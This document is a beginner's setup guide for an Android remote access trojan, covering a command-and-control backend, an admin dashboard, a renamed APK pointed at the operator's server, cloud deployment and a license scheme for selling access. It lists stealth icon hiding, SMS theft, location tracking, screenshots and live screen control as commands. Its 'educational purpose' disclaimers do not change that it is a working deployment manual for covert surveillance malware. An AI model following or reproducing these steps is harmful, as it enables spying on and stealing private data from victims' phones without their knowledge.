# 🚀 COMPLETE BEGINNER SETUP GUIDE - Step by Step

## ⚠️ EDUCATIONAL PURPOSE ONLY

**Complete guide for absolute beginners to setup and use this RAT system.**

---

## 📋 **TABLE OF CONTENTS**

1. [Requirements](#requirements)
2. [Installation](#installation)
3. [Backend Setup](#backend-setup)
4. [Frontend Setup](#frontend-setup)
5. [Android APK Setup](#android-apk-setup)
6. [License System Setup](#license-system-setup)
7. [Testing](#testing)
8. [Deployment](#deployment)
9. [Troubleshooting](#troubleshooting)

---

## 1️⃣ **REQUIREMENTS**

### **Software Needed:**

**On Your Computer:**
- ✅ Node.js (v16 or higher) - [Download](https://nodejs.org/)
- ✅ Git - [Download](https://git-scm.com/)
- ✅ Android Studio - [Download](https://developer.android.com/studio)
- ✅ Python 3 - [Download](https://www.python.org/)
- ✅ Text Editor (VS Code recommended) - [Download](https://code.visualstudio.com/)

**On Android Device:**
- ✅ Android 6.0 or higher
- ✅ Developer options enabled
- ✅ USB debugging enabled

---

## 2️⃣ **INSTALLATION**

### **Step 1: Install Node.js**

```bash
# Check if Node.js is installed
node --version

# Should show: v16.x.x or higher
```

**If not installed:**
1. Go to https://nodejs.org/
2. Download LTS version
3. Install with default settings
4. Restart terminal

### **Step 2: Install Git**

```bash
# Check if Git is installed
git --version

# Should show: git version 2.x.x
```

**If not installed:**
1. Go to https://git-scm.com/
2. Download for your OS
3. Install with default settings

### **Step 3: Clone Repository**

```bash
# Open terminal/command prompt
# Navigate to where you want the project
cd Desktop

# Clone the repository
git clone https://github.com/kishan7878/RemoteAccess-Educational.git

# Enter the project folder
cd RemoteAccess-Educational
```

---

## 3️⃣ **BACKEND SETUP**

### **Step 1: Install Dependencies**

```bash
# Navigate to backend folder
cd backend

# Install all required packages
npm install

# This will install:
# - express (web server)
# - socket.io (real-time communication)
# - mongoose (database)
# - cors (cross-origin requests)
# - and more...
```

### **Step 2: Configure Backend**

**Edit `backend/config.js`:**

```javascript
module.exports = {
    // Server port
    PORT: 5000,
    
    // MongoDB connection (optional)
    MONGODB_URI: 'mongodb://localhost:27017/rat-db',
    
    // License encryption keys (CHANGE THESE!)
    LICENSE_KEY: 'YourSecretKey12345YourSecretKey12',
    LICENSE_IV: 'YourSecretIV1234',
    
    // Admin credentials (CHANGE THESE!)
    ADMIN_USERNAME: 'admin',
    ADMIN_PASSWORD: 'admin123',
    
    // CORS settings
    CORS_ORIGIN: '*'
};
```

### **Step 3: Start Backend**

```bash
# Start the server
npm start

# You should see:
# ✅ Server running on port 5000
# ✅ Socket.io initialized
# ✅ MongoDB connected (if configured)
```

**Keep this terminal open!**

---

## 4️⃣ **FRONTEND SETUP**

### **Step 1: Open New Terminal**

```bash
# Navigate to frontend folder
cd frontend

# Start simple HTTP server
python -m http.server 3000

# Or if you have Python 2:
python -m SimpleHTTPServer 3000
```

### **Step 2: Access Dashboard**

**Open browser and go to:**
```
http://localhost:3000/admin-dashboard.html
```

**You should see:**
- Beautiful purple gradient dashboard
- Statistics cards
- Device list (empty initially)
- Control panel with tabs

---

## 5️⃣ **ANDROID APK SETUP**

### **Step 1: Install Android Studio**

1. Download from https://developer.android.com/studio
2. Install with default settings
3. Open Android Studio
4. Complete initial setup

### **Step 2: Open Project**

1. Click "Open an Existing Project"
2. Navigate to `RemoteAccess-Educational/android`
3. Click "OK"
4. Wait for Gradle sync (first time takes 5-10 minutes)

### **Step 3: Configure APK**

**Edit `android/app/src/main/res/values/strings.xml`:**

```xml
<resources>
    <!-- Change app name -->
    <string name="app_name">MyApp</string>
    
    <!-- Change server URL -->
    <string name="server_url">http://YOUR_IP:5000</string>
</resources>
```

**Find your IP address:**

**Windows:**
```bash
ipconfig
# Look for IPv4 Address
```

**Mac/Linux:**
```bash
ifconfig
# Look for inet address
```

**Example:**
```xml
<string name="server_url">http://192.168.1.100:5000</string>
```

### **Step 4: Change Package Name**

**Edit `android/app/build.gradle`:**

```gradle
android {
    defaultConfig {
        // Change package name
        applicationId "com.yourname.yourapp"
        
        // Other settings...
    }
}
```

### **Step 5: Build APK**

**Option A: Using Android Studio**
1. Click "Build" menu
2. Click "Build Bundle(s) / APK(s)"
3. Click "Build APK(s)"
4. Wait for build to complete
5. Click "locate" to find APK

**Option B: Using Command Line**
```bash
# Navigate to android folder
cd android

# Build release APK
./gradlew assembleRelease

# APK location:
# android/app/build/outputs/apk/release/app-release.apk
```

---

## 6️⃣ **LICENSE SYSTEM SETUP**

### **Step 1: Generate License**

**Create `backend/generate-license.js`:**

```javascript
const crypto = require('crypto');

// Encryption settings (must match Android app)
const ENCRYPTION_KEY = 'YourSecretKey12345YourSecretKey12'; // 32 bytes
const ENCRYPTION_IV = 'YourSecretIV1234'; // 16 bytes

function generateLicense(deviceId, validityDays) {
    // Current timestamp
    const currentTime = Date.now();
    
    // Expiry timestamp
    const expiryTime = currentTime + (validityDays * 24 * 60 * 60 * 1000);
    
    // License data
    const license = {
        deviceId: deviceId,
        issuedAt: currentTime,
        expiresAt: expiryTime,
        validityDays: validityDays
    };
    
    // Generate signature
    const signature = crypto
        .createHash('sha256')
        .update(deviceId + '|' + expiryTime + '|' + ENCRYPTION_KEY)
        .digest('hex');
    
    license.signature = signature;
    
    // Encrypt license
    const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, ENCRYPTION_IV);
    let encrypted = cipher.update(JSON.stringify(license), 'utf8', 'base64');
    encrypted += cipher.final('base64');
    
    return encrypted;
}

// Example usage
const deviceId = 'abc123def456'; // Get from device
const validityDays = 30; // 30 days license

const license = generateLicense(deviceId, validityDays);
console.log('License Key:', license);
```

**Run:**
```bash
node generate-license.js
```

### **Step 2: Get Device ID**

**On Android device:**
1. Install APK
2. Open app
3. Go to Settings
4. Copy Device ID

**Or send command from dashboard:**
```javascript
{
  "command": "get_device_id"
}
```

### **Step 3: Activate License**

**Send command from dashboard:**
```javascript
{
  "command": "activate_license",
  "params": {
    "licenseKey": "YOUR_GENERATED_LICENSE_KEY"
  }
}
```

### **Step 4: Validate License**

**Send command:**
```javascript
{
  "command": "validate_license"
}
```

**Response:**
```json
{
  "valid": true,
  "expiryDate": "20 Jan 2025 15:30:00",
  "daysRemaining": 25
}
```

---

## 7️⃣ **TESTING**

### **Step 1: Test Backend**

```bash
# Backend should be running
# Open browser: http://localhost:5000

# You should see:
# "RAT Backend Server Running"
```

### **Step 2: Test Dashboard**

```bash
# Open: http://localhost:3000/admin-dashboard.html

# Check:
# ✅ Dashboard loads
# ✅ Statistics show
# ✅ Tabs work
# ✅ No console errors
```

### **Step 3: Test Android Connection**

1. Install APK on Android device
2. Open app
3. Grant all permissions
4. Check dashboard - device should appear
5. Click on device to select
6. Try basic commands:
   - Get Device Info
   - Get Location
   - Get Battery Info

### **Step 4: Test License System**

1. Get device ID from device
2. Generate license using script
3. Activate license on device
4. Validate license
5. Check expiry date

### **Step 5: Test Advanced Features**

**Live Streaming:**
1. Go to "Live Stream" tab
2. Set FPS: 15, Quality: 50
3. Click "Start Stream"
4. You should see live screen

**Stealth Mode:**
1. Go to "Stealth" tab
2. Click "Hide Icon"
3. App icon should disappear
4. Click "Show Icon" to restore

**Screen Control:**
1. Go to "Advanced" tab
2. Click "Read Screen"
3. You should see UI elements
4. Try "Press Back" or "Press Home"

---

## 8️⃣ **DEPLOYMENT**

### **Deploy Backend to VPS**

**Option A: Heroku (Free)**

```bash
# Install Heroku CLI
npm install -g heroku

# Login
heroku login

# Create app
heroku create your-app-name

# Deploy
git push heroku main

# Your backend URL:
# https://your-app-name.herokuapp.com
```

**Option B: DigitalOcean/AWS**

1. Create VPS instance
2. SSH into server
3. Install Node.js
4. Clone repository
5. Install dependencies
6. Run with PM2:

```bash
npm install -g pm2
pm2 start backend/server.js
pm2 save
pm2 startup
```

### **Update APK with Production URL**

**Edit `strings.xml`:**
```xml
<string name="server_url">https://your-app-name.herokuapp.com</string>
```

**Rebuild APK:**
```bash
cd android
./gradlew assembleRelease
```

---

## 9️⃣ **TROUBLESHOOTING**

### **Backend Issues**

**Problem: Port already in use**
```bash
# Change port in config.js
PORT: 5001
```

**Problem: MongoDB connection failed**
```bash
# Make MongoDB optional or install locally
# Or use MongoDB Atlas (free cloud)
```

### **Frontend Issues**

**Problem: Dashboard not loading**
```bash
# Check if Python server is running
# Try different port:
python -m http.server 8000
```

**Problem: Can't connect to backend**
```bash
# Check backend is running
# Check firewall settings
# Check CORS settings in backend
```

### **Android Issues**

**Problem: APK won't install**
```bash
# Enable "Install from Unknown Sources"
# Settings > Security > Unknown Sources
```

**Problem: Device not connecting**
```bash
# Check server URL in strings.xml
# Check device has internet
# Check firewall allows connection
```

**Problem: Permissions not granted**
```bash
# Manually grant in Settings
# Settings > Apps > Your App > Permissions
```

### **License Issues**

**Problem: License invalid**
```bash
# Check encryption keys match
# Check device ID is correct
# Regenerate license
```

**Problem: License expired**
```bash
# Generate new license
# Activate new license
```

---

## 🎯 **QUICK REFERENCE**

### **Start Everything:**

```bash
# Terminal 1: Backend
cd backend
npm start

# Terminal 2: Frontend
cd frontend
python -m http.server 3000

# Browser:
http://localhost:3000/admin-dashboard.html
```

### **Common Commands:**

```javascript
// Device info
{ "command": "get_device_info" }

// Location
{ "command": "get_location" }

// SMS
{ "command": "get_sms" }

// Screenshot
{ "command": "take_screenshot" }

// Hide icon
{ "command": "hide_app_icon" }

// License
{ "command": "validate_license" }
```

---

## 📞 **SUPPORT**

**If you get stuck:**
1. Check this guide again
2. Check error messages
3. Google the error
4. Create GitHub issue
5. Email: decentkishan78@gmail.com

---

## ✅ **CHECKLIST**

Before going live, verify:

- [ ] Backend running
- [ ] Frontend accessible
- [ ] APK built successfully
- [ ] Server URL configured
- [ ] License system working
- [ ] All features tested
- [ ] Firewall configured
- [ ] HTTPS enabled (production)
- [ ] Admin credentials changed
- [ ] Encryption keys changed

---

**🎉 SETUP COMPLETE! YOU'RE READY TO GO!** 🚀

**Remember: Educational use only! Get proper authorization!** 🎓
